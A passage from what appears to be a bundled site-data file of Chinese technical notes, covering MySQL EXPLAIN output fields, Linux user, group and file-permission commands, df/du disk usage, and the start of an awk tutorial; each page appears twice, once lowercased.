查询字段都是索引字段，但是 order by 字段和 select 索引字段的顺序不一致，都会导致 fileSort\n\n\n\n\n# using temporary（重点优化）\n\n使用了临时表保存中间结果，常见于 order by 和 group by 中。\n\n\n\n\n# USING index（重点）\n\n表示相应的 select 操作中使用了覆盖索引（Coveing Index）, 避免访问了表的数据行，效率不错！ 如果同时出现 using where，表明索引被用来执行索引键值的查找；如果没有同时出现 using where，表面索引用来读取数据而非执行查找动作。\n\n\n\n\n# Using wher\n\n表明使用了 where 过滤\n\n\n# using join buffer\n\n使用了连接缓存\n\n\n# impossible where\n\nwhere 子句的值总是 false，不能用来获取任何元组\n\n\n# select tables optimized away\n\n在没有 GROUPBY 子句的情况下，基于索引优化 MIN/MAX 操作或者 对于 MyISAM 存储引擎优化 COUNT (*) 操作，不必等到执行阶段再进行计算， 查询执行计划生成的阶段即完成优化。\n\n\n# distinct\n\n优化 distinct，在找到第一匹配的元组后即停止找同样值的工作",normalizedContent:"# explain 用法\n\n模拟 mysql 优化器是如何执行 sql 查询语句的，从而知道 mysql 是如何处理你的 sql 语句的。分析你的查询语句或是表结构的性能瓶颈。\n语法：explain + sql 语句；\n如：explain select * from user; 会生成如下 sql 分析结果，下面详细对每个字段进行详解\n\n\n\n\n# id\n\n是一组数字，代表多个表之间的查询顺序，或者包含子句查询语句中的顺序，id 总共分为三种情况，依次详解\n\nid 相同，执行顺序由上至下\nid 不同，如果是子查询，id 号会递增，id 值越大优先级越高，越先被执行\nid 相同和不同的情况同时存在\n\n\n# select_type\n\nselect_type 包含以下几种值：\n\n * simple\n   简单的 select 查询，查询中不包含子查询或者 union 查询\n\n\n\n * primary\n   如果 sql 语句中包含任何子查询，那么子查询的最外层会被标记为 primary\n\n\n\n * subquery\n   在 select 或者 where 里包含了子查询，那么子查询就会被标记为 subqquery，同三。二同时出现\n\n\n\n * derived\n   在 from 中包含的子查询，会被标记为衍生查询，会把查询结果放到一个临时表中\n\n\n\n * union / union result\n   如果有两个 select 查询语句，他们之间用 union 连起来查询，那么第二个 select 会被标记为 union，union 的结果被标记为 union result。它的 id 是为 null 的\n\n\n\n\n# table\n\n表示这一行的数据是哪张表的数据\n\n\n# type\n\ntype 是代表 mysql 使用了哪种索引类型，不同的索引类型的查询效率也是不一样的，常用的类型有： all、index、range、 ref、eq_ref、const、system、null（从上到下，性能从差到好）\n\n * all\n   full table scan， mysql 将遍历全表以找到匹配的行\n * index\n   full index scan，index 与 all 区别为 index 类型只遍历索引树\n * range\n   只检索给定范围的行，使用一个索引来选择行\n * ref\n   表示上述表的连接匹配条件，即哪些列或常量被用于查找索引列上的值\n * eq_ref\n   类似 ref，区别就在使用的索引是唯一索引，对于每个索引键值，表中只有一条记录匹配，简单来说，就是多表连接中使用 primary key 或者 unique key 作为关联条件\n * const、system\n   当 mysql 对查询某部分进行优化，并转换为一个常量时，使用这些类型访问。如将主键置于 where 列表中，mysql 就能将该查询转换为一个常量，system 是 const 类型的特例，当查询的表只有一行的情况下，使用 system\n * null\n   mysql 在优化过程中分解语句，执行时甚至不用访问表或索引，例如从一个索引列里选取最小值可以通过单独索引查找完成。\n\n\n# possible_keys\n\n此次查询中涉及字段上若存在索引，则会被列出来，表示可能会用到的索引，但并不是实际上一定会用到的索引\n\n\n# key\n\nkey 列显示 mysql 实际决定使用的键（索引），必然包含在 possible_keys 中\n如果没有选择索引，键是 null。要想强制 mysql 使用或忽视 possible_keys 列中的索引，在查询中使用 force index、use index 或者 ignore index。\n\n\n# key_len\n\n表示索引中使用的字节数，通过该属性可以知道在查询中使用的索引长度，注意：这个长度是最大可能长度，并非实际使用长度，在不损失精确性的情况下，长度越短查询效率越高\n\n\n# ref\n\n显示关联的字段。如果使用常数等值查询，则显示 const，如果是连接查询，则会显示关联的字段。\n\n\n\n * tb_emp 表为非唯一性索引扫描，实际使用的索引列为 idx_name，由于 tb_emp.name='rose' 为一个常量，所以 ref=const。\n * tb_dept 为唯一索引扫描，从 sql 语句可以看出，实际使用了 primary 主键索引，ref=db01.tb_emp.deptid 表示关联了 db01 数据库中 tb_emp 表的 deptid 字段。\n\n\n# rows\n\n根据表信息统计以及索引的使用情况，大致估算说要找到所需记录需要读取的行数，rows 越小越好\n\n\n# extra\n\n不适合在其他列显示出来，但在优化时十分重要的信息\n\n\n# using filesort（重点优化）\n\n俗称 \"文件排序\" ，在数据量大的时候几乎是 “九死一生”，在 order by 或者在 group by 排序的过程中，order by 的字段不是索引字段，或者 select 查询字段存在不是索引字段，或者 select 查询字段都是索引字段，但是 order by 字段和 select 索引字段的顺序不一致，都会导致 filesort\n\n\n\n\n# using temporary（重点优化）\n\n使用了临时表保存中间结果，常见于 order by 和 group by 中。\n\n\n\n\n# using index（重点）\n\n表示相应的 select 操作中使用了覆盖索引（coveing index）, 避免访问了表的数据行，效率不错！ 如果同时出现 using where，表明索引被用来执行索引键值的查找；如果没有同时出现 using where，表面索引用来读取数据而非执行查找动作。\n\n\n\n\n# using wher\n\n表明使用了 where 过滤\n\n\n# using join buffer\n\n使用了连接缓存\n\n\n# impossible where\n\nwhere 子句的值总是 false，不能用来获取任何元组\n\n\n# select tables optimized away\n\n在没有 groupby 子句的情况下，基于索引优化 min/max 操作或者 对于 myisam 存储引擎优化 count (*) 操作，不必等到执行阶段再进行计算， 查询执行计划生成的阶段即完成优化。\n\n\n# distinct\n\n优化 distinct，在找到第一匹配的元组后即停止找同样值的工作",charsets:{cjk:!0}},{title:"linux 创建用户及权限操作",frontmatter:{title:"linux 创建用户及权限操作",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2300",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2300.Linux%20%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%8F%8A%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C.html",relativePath:"04.运维/2300.linux/2300.Linux 创建用户及权限操作.md",key:"v-066dd738",path:"/linux/2300/",headers:[{level:2,title:"用户",slug:"用户",normalizedTitle:"用户",charIndex:2},{level:3,title:"usermod",slug:"usermod",normalizedTitle:"usermod",charIndex:512},{level:2,title:"用户组 group",slug:"用户组-group",normalizedTitle:"用户组 group",charIndex:1095},{level:2,title:"文件权限 chown",slug:"文件权限-chown",normalizedTitle:"文件权限 chown",charIndex:1635},{level:2,title:"chmod",slug:"chmod",normalizedTitle:"chmod",charIndex:2059}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"用户 usermod 用户组 group 文件权限 chown chmod",content:'# 用户\n\n关于 useradd 的某些参数：\n\n * -u UID：指定 UID，这个 UID 必须是大于等于 500，并没有其他用户占用的 UID\n * -g GID/GROUPNAME：指定默认组，可以是 GID 或者 GROUPNAME，同样也必须真实存在\n * -G GROUPS：指定附加组\n * -c COMMENT：指定用户的注释信息\n * -d PATH：指定用户的家目录\n\n> -g 基本组：如果没有指定用户组，创建用户的时候系统会默认同时创建一个和这个用户名同名的组，这个组就是基本组，不可以把用户从基本组中删除。在创建文件时，文件的所属组就是用户的基本组。\n> -G 附加组：除了基本组之外，用户所在的其他组，都是附加组。用户是可以从附加组中被删除的。\n> 用户不论为与基本组中还是附加组中，就会拥有该组的权限。一个用户可以属于多个附加组。但是一个用户只能有一个基本组。\n\n查看所有用户\n\ncat /etc/passwd\n\n\n1\n\n\n添加\n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\n删除用户及关联的目录\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod 命令用于修改用户帐号。\n\n * -c <备注> 　修改用户帐号的备注文字。\n * -d 登入目录 > 　修改用户登入时的目录。\n * -e <有效期限> 　修改帐号的有效期限。\n * -f <缓冲天数> 　修改在密码过期后多少天即关闭该帐号。\n * -g <主组> 　修改用户所属主组。\n * -G <群组> 　修改用户所属的附加群组。\n * -l <帐号名称> 　修改用户帐号名称。\n * -L 锁定用户密码，使密码无效。\n * -s 修改用户登入后所使用的 shell。\n * -u 修改用户 ID。\n * -U 解除密码锁定。\n * -a 代表 append，也就是将用户添加到新用户组中而不必离开原有的其他用户组\n\n将 xulei 添加到 root 组\n\nusermod -g root xulei\n\n\n1\n\n\n如果添加的用户不能通过 ssh 登录，可以查看用户受否有 bash 权限\n\n# 查看所有用户，可以查看用户是否有如下路径\ncat /etc/passwd\n# 修改用户有 /bin/bash 权限\nusermod -s /bin/bash 用户名\n# 禁止用户有 /bin/bash 改为 /sbin/nologin\nusermod -s /sbin/nologin 用户名\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 用户组 group\n\n关于组的增加和删除信息会在 etc 目录的 group 文件中找到，命令 cat /etc/group 可以看到自己的分组和分组 id，0 表示管理员（root），1 - 500 表示系统用户。\n\ngroupadd 命令 语法格式如下：\n\n * -g：指定新建工作组的 id；\n * -r：创建系统工作组，系统工作组的组 ID 小于 500；\n * -K：覆盖配置文件 "/ect/login.defs"；\n * -o：允许添加组 ID 号不唯一的工作组。\n * -f,--force: 如果指定的组已经存在，此选项将失明了仅以成功状态退出。当与 -g 一起使用，并且指定的 GID_MIN 已经存在时，选择另一个唯一的 GID（即 - g 关闭）。\n\n查看所有组\n\ncat /etc/group\n\n\n1\n\n\n查看当前组\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\n查看用户所属组\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\n删除组\n\ngroupdel xulei\n\n\n1\n\n\n添加额外组\n\nusermod -a -G 组名称 用户名\n\n\n1\n\n\n\n# 文件权限 chown\n\n用来更改某个目录或文件的用户名和用户组。\n\n * user : 新的档案拥有者的使用者 ID\n * group : 新的档案拥有者的使用者群体 (group)\n * -c : 若该档案拥有者确实已经更改，才显示其更改动作\n * -f : 若该档案拥有者无法被更改也不要显示错误讯息\n * -h : 只对于连结 (link) 进行变更，而非该 link 真正指向的档案\n * -v : 显示拥有者变更的详细资料\n * -R : 对目前目录下的所有档案与子目录进行相同的拥有者变更 (即以递回的方式逐个变更)\n * --help : 显示辅助说明\n * --version : 显示版本\n\n修改 abc 文件的所有者\n\nchown root abc\n\n\n1\n\n\n把目录 /demo 及其下的所有文件和子目录的所有人改成 root，所属组改成 roota。\n\nchown -R root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- 一共 10 个字符，下面讲解下：\n\n * d 表示目录，如果是 - 表示是一个普通文件。剩余的 9 个字符，分成 3 组，每组 3 个字符，分别表示 user/group/others 的 rwx 权限；\n * u user 表示拥有者，可以看到拥有者是 xulei 用户，但文件还属于 root 组，因此 xulei 还是无法执行该文件。\n * g group 表示组，除了 mysql 这个人的 同一个 MySQL 组拥有的权力\n * o others 就是其他人了，啥权限也没有。\n * a 表示 “所有 (all) 用户”。它是系统默认值。\n\n[root@node102 sh]# chmod a+rwx checkLogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 Jan 19 17:31 checkLogin.sh\n-rwxr--r--. 1 root  root 123 Sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 Nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',normalizedContent:'# 用户\n\n关于 useradd 的某些参数：\n\n * -u uid：指定 uid，这个 uid 必须是大于等于 500，并没有其他用户占用的 uid\n * -g gid/groupname：指定默认组，可以是 gid 或者 groupname，同样也必须真实存在\n * -g groups：指定附加组\n * -c comment：指定用户的注释信息\n * -d path：指定用户的家目录\n\n> -g 基本组：如果没有指定用户组，创建用户的时候系统会默认同时创建一个和这个用户名同名的组，这个组就是基本组，不可以把用户从基本组中删除。在创建文件时，文件的所属组就是用户的基本组。\n> -g 附加组：除了基本组之外，用户所在的其他组，都是附加组。用户是可以从附加组中被删除的。\n> 用户不论为与基本组中还是附加组中，就会拥有该组的权限。一个用户可以属于多个附加组。但是一个用户只能有一个基本组。\n\n查看所有用户\n\ncat /etc/passwd\n\n\n1\n\n\n添加\n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\n删除用户及关联的目录\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod 命令用于修改用户帐号。\n\n * -c <备注> 　修改用户帐号的备注文字。\n * -d 登入目录 > 　修改用户登入时的目录。\n * -e <有效期限> 　修改帐号的有效期限。\n * -f <缓冲天数> 　修改在密码过期后多少天即关闭该帐号。\n * -g <主组> 　修改用户所属主组。\n * -g <群组> 　修改用户所属的附加群组。\n * -l <帐号名称> 　修改用户帐号名称。\n * -l 锁定用户密码，使密码无效。\n * -s 修改用户登入后所使用的 shell。\n * -u 修改用户 id。\n * -u 解除密码锁定。\n * -a 代表 append，也就是将用户添加到新用户组中而不必离开原有的其他用户组\n\n将 xulei 添加到 root 组\n\nusermod -g root xulei\n\n\n1\n\n\n如果添加的用户不能通过 ssh 登录，可以查看用户受否有 bash 权限\n\n# 查看所有用户，可以查看用户是否有如下路径\ncat /etc/passwd\n# 修改用户有 /bin/bash 权限\nusermod -s /bin/bash 用户名\n# 禁止用户有 /bin/bash 改为 /sbin/nologin\nusermod -s /sbin/nologin 用户名\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 用户组 group\n\n关于组的增加和删除信息会在 etc 目录的 group 文件中找到，命令 cat /etc/group 可以看到自己的分组和分组 id，0 表示管理员（root），1 - 500 表示系统用户。\n\ngroupadd 命令 语法格式如下：\n\n * -g：指定新建工作组的 id；\n * -r：创建系统工作组，系统工作组的组 id 小于 500；\n * -k：覆盖配置文件 "/ect/login.defs"；\n * -o：允许添加组 id 号不唯一的工作组。\n * -f,--force: 如果指定的组已经存在，此选项将失明了仅以成功状态退出。当与 -g 一起使用，并且指定的 gid_min 已经存在时，选择另一个唯一的 gid（即 - g 关闭）。\n\n查看所有组\n\ncat /etc/group\n\n\n1\n\n\n查看当前组\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\n查看用户所属组\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\n删除组\n\ngroupdel xulei\n\n\n1\n\n\n添加额外组\n\nusermod -a -g 组名称 用户名\n\n\n1\n\n\n\n# 文件权限 chown\n\n用来更改某个目录或文件的用户名和用户组。\n\n * user : 新的档案拥有者的使用者 id\n * group : 新的档案拥有者的使用者群体 (group)\n * -c : 若该档案拥有者确实已经更改，才显示其更改动作\n * -f : 若该档案拥有者无法被更改也不要显示错误讯息\n * -h : 只对于连结 (link) 进行变更，而非该 link 真正指向的档案\n * -v : 显示拥有者变更的详细资料\n * -r : 对目前目录下的所有档案与子目录进行相同的拥有者变更 (即以递回的方式逐个变更)\n * --help : 显示辅助说明\n * --version : 显示版本\n\n修改 abc 文件的所有者\n\nchown root abc\n\n\n1\n\n\n把目录 /demo 及其下的所有文件和子目录的所有人改成 root，所属组改成 roota。\n\nchown -r root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- 一共 10 个字符，下面讲解下：\n\n * d 表示目录，如果是 - 表示是一个普通文件。剩余的 9 个字符，分成 3 组，每组 3 个字符，分别表示 user/group/others 的 rwx 权限；\n * u user 表示拥有者，可以看到拥有者是 xulei 用户，但文件还属于 root 组，因此 xulei 还是无法执行该文件。\n * g group 表示组，除了 mysql 这个人的 同一个 mysql 组拥有的权力\n * o others 就是其他人了，啥权限也没有。\n * a 表示 “所有 (all) 用户”。它是系统默认值。\n\n[root@node102 sh]# chmod a+rwx checklogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 jan 19 17:31 checklogin.sh\n-rwxr--r--. 1 root  root 123 sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',charsets:{cjk:!0}},{title:"Linux 磁盘操作相关命令",frontmatter:{title:"Linux 磁盘操作相关命令",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2301",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2301.Linux%20%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.html",relativePath:"04.运维/2300.linux/2301.Linux 磁盘操作相关命令.md",key:"v-4fbe8f80",path:"/linux/2301/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"Df 命令是 linux 系统以磁盘分区为单位查看文件系统，可以加上参数查看磁盘剩余空间信息，命令格式位 df -h ，显示内容如下：\n\nFILESYSTEM   SIZE   USED   AVAIL   USE%   MOUNTED ON\n文件系统         容量     可用     Use%    已用 %   挂载点\n/dev/hda2    45G    19G    24G     44%    /\n/dev/hda1    494M   19M    450M    4%     /boot\n\n查看磁盘剩余空间 df -hl\n\n[root@localhost /]# df -hl\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n查看每个根路径的分区大小 df -h\n\n[root@localhost /]# df -h\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n返回该目录的大小 du -sh [目录名]\n\n[root@localhost /]# du -sh /root\n803M    /root\n\n\n1\n2\n\n\n返回该文件夹总 M 数 du -sm [文件夹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\n查看指定文件夹下的所有文件大小（包含子文件夹) du -h [目录名]\n\n[root@localhost /]# du -h /root\n12K     /root/redis-6.0.5/utils/hyperloglog\n20K     /root/redis-6.0.5/utils/lru\n20K     /root/redis-6.0.5/utils/releasetools\n12K     /root/redis-6.0.5/utils/srandmember\n164K    /root/redis-6.0.5/utils\n71M     /root/redis-6.0.5\n803M    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n产看文件属于哪个磁盘 df -h [目录]\n\n# 没有挂载磁盘的目录，显示在系统盘\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /alidata/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vda1        40G  4.6G   33G  13% /\n\n\n1\n2\n3\n4\n\n\n# 挂载了磁盘的目录，显示在数据盘分区vdb1\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /mnt/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vdb1        20G   45M   19G   1% /mnt\n\n\n1\n2\n3\n4\n\n\n在显示结果中的 Filesystem 和 Mounted on，这两列就是这个目录所属的磁盘分区。\n因为 Linux 是树形文件系统，目录属于哪个磁盘分区取决于挂载磁盘时的挂载点，所以要想知道目录在哪个分区，就要借助显示磁版盘信息（特别能显示挂载点）的命令。df 命令是显示磁盘容量的，但是以目录作为参数，可以显示目录所在磁盘的信息。所以这个笨办法也算是个好办法吧。",normalizedContent:"df 命令是 linux 系统以磁盘分区为单位查看文件系统，可以加上参数查看磁盘剩余空间信息，命令格式位 df -h ，显示内容如下：\n\nfilesystem   size   used   avail   use%   mounted on\n文件系统         容量     可用     use%    已用 %   挂载点\n/dev/hda2    45g    19g    24g     44%    /\n/dev/hda1    494m   19m    450m    4%     /boot\n\n查看磁盘剩余空间 df -hl\n\n[root@localhost /]# df -hl\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n查看每个根路径的分区大小 df -h\n\n[root@localhost /]# df -h\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n返回该目录的大小 du -sh [目录名]\n\n[root@localhost /]# du -sh /root\n803m    /root\n\n\n1\n2\n\n\n返回该文件夹总 m 数 du -sm [文件夹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\n查看指定文件夹下的所有文件大小（包含子文件夹) du -h [目录名]\n\n[root@localhost /]# du -h /root\n12k     /root/redis-6.0.5/utils/hyperloglog\n20k     /root/redis-6.0.5/utils/lru\n20k     /root/redis-6.0.5/utils/releasetools\n12k     /root/redis-6.0.5/utils/srandmember\n164k    /root/redis-6.0.5/utils\n71m     /root/redis-6.0.5\n803m    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n产看文件属于哪个磁盘 df -h [目录]\n\n# 没有挂载磁盘的目录，显示在系统盘\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /alidata/\nfilesystem      size  used avail use% mounted on\n/dev/vda1        40g  4.6g   33g  13% /\n\n\n1\n2\n3\n4\n\n\n# 挂载了磁盘的目录，显示在数据盘分区vdb1\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /mnt/\nfilesystem      size  used avail use% mounted on\n/dev/vdb1        20g   45m   19g   1% /mnt\n\n\n1\n2\n3\n4\n\n\n在显示结果中的 filesystem 和 mounted on，这两列就是这个目录所属的磁盘分区。\n因为 linux 是树形文件系统，目录属于哪个磁盘分区取决于挂载磁盘时的挂载点，所以要想知道目录在哪个分区，就要借助显示磁版盘信息（特别能显示挂载点）的命令。df 命令是显示磁盘容量的，但是以目录作为参数，可以显示目录所在磁盘的信息。所以这个笨办法也算是个好办法吧。",charsets:{cjk:!0}},{title:"Linux 文本数据处理工具awk命令",frontmatter:{title:"Linux 文本数据处理工具awk命令",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2302",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2302.Linux%20%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7awk%E5%91%BD%E4%BB%A4.html",relativePath:"04.运维/2300.linux/2302.Linux 文本数据处理工具awk命令.md",key:"v-008f5f06",path:"/linux/2302/",headers:[{level:2,title:"F（指定字段分隔符）",slug:"f-指定字段分隔符",normalizedTitle:"f（指定字段分隔符）",charIndex:79},{level:2,title:"FS（字段分隔符）",slug:"fs-字段分隔符",normalizedTitle:"fs（字段分隔符）",charIndex:368},{level:2,title:"NF（当前行的字段个数）",slug:"nf-当前行的字段个数",normalizedTitle:"nf（当前行的字段个数）",charIndex:683},{level:2,title:"NR (当前处理的是第几行)",slug:"nr-当前处理的是第几行",normalizedTitle:"nr (当前处理的是第几行)",charIndex:900},{level:2,title:"FILENAME(当前文件名)",slug:"filename-当前文件名",normalizedTitle:"filename (当前文件名)",charIndex:1458},{level:2,title:"其他变量",slug:"其他变量",normalizedTitle:"其他变量",charIndex:1794},{level:2,title:"print 和 printf",slug:"print-和-printf",normalizedTitle:"print 和 printf",charIndex:1911},{level:2,title:"其他函数",slug:"其他函数",normalizedTitle:"其他函数",charIndex:2139},{level:2,title:"条件",slug:"条件",normalizedTitle:"条件",charIndex:2690},{level:2,title:"demo",slug:"demo",normalizedTitle:"demo",charIndex:3964}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"F（指定字段分隔符） FS（字段分隔符） NF（当前行的字段个数） NR (当前处理的是第几行) FILENAME(当前文件名) 其他变量 print 和 printf 其他函数 条件 demo",content:'awk 命令是逐行扫描文件（从第 1 行到最后一行），寻找含有目标文本的行，如果匹配成功，则会在该行上执行用户想要的操作；反之，则不对行做任何处理。\n\n\n# F（指定字段分隔符）\n\n默认使用空格作为分隔符。\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -F \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -F \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# FS（字段分隔符）\n\n默认是空格和制表符。\n$0 表示当前整行内容，$1，$2 表示第一个字段，第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# NF（当前行的字段个数）\n\n就代表最后一个字段，(NF-1) 代表倒数第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $NF}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(NF-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# NR (当前处理的是第几行)\n\n打印当前行号和当前文本内容\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print NR")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n逗号表示输出的变量之间用空格分隔；\n右括号必需使用 双引号 才可以原样输出\n打印指定行内容：\n\n[root@localhost S17]# java -version \njava version "1.8.0_131"\nJava(TM) SE Runtime Environment (build 1.8.0_131-b11)\nJava HotSpot(TM) 64-Bit Server VM (build 25.131-b11, mixed mode)\n[root@localhost S17]# java -version 2>&1  | awk \'NR==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost S17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# FILENAME (当前文件名)\n\n[root@localhost awk]#  awk \'{print FILENAME, NR")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print FILENAME, NR")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename 这种形式时可以打印文件名；\n通过 |（管道符）读取内容时打印的是 -\n\n\n# 其他变量\n\nRS：行分隔符，用于分割每一行，默认是换行符。\nOFS：输出字段的分隔符，用于打印时分隔字段，默认为空格。\nORS：输出记录的分隔符，用于打印时分隔记录，默认为换行符。\nOFMT：数字输出的格式，默认为％.6g。\n\n\n# print 和 printf\n\nawk 中同时提供了 print 和 printf 两种打印输出的函数。\n\nprint 函数，参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。\n\nprintf 函数，其用法和 c 语言中 printf 基本相似，可以格式化字符串，输出复杂时，printf 更加好用，代码更易懂。\n\n\n# 其他函数\n\ntoupper ()：字符转为大写。\ntolower ()：字符转为小写。\nlength ()：返回字符串长度。\nsubstr ()：返回子字符串。\nsubstr ($1,2)：返回第一个字段，从第 2 个字符开始一直到结束。\nsubstr ($1,2,3)：返回第一个字段，从第 2 个字符开始开始后的 3 个字符。\nsin ()：正弦。\ncos ()：余弦。\nsqrt ()：平方根。\nrand ()：随机数。\n\n[root@localhost 